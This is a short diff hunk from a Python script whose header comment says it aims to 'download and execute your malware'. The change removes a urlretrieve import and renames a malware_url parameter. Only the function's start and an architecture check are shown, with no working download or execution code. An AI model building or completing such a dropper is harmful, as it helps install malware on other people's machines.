@@ -2,10 +2,9 @@
 #This script aims to download and execute your malware (¯\_(ツ)_/¯)
 #Start
 from os import popen,_exit
-from urllib.request import urlretrieve
 from platform import architecture
 
-def fire_things_up(malware_url,arch="No"):
+def fire_things_up(url,arch="No"):
     url   = ""
     #check architecture
     if arch != "No":
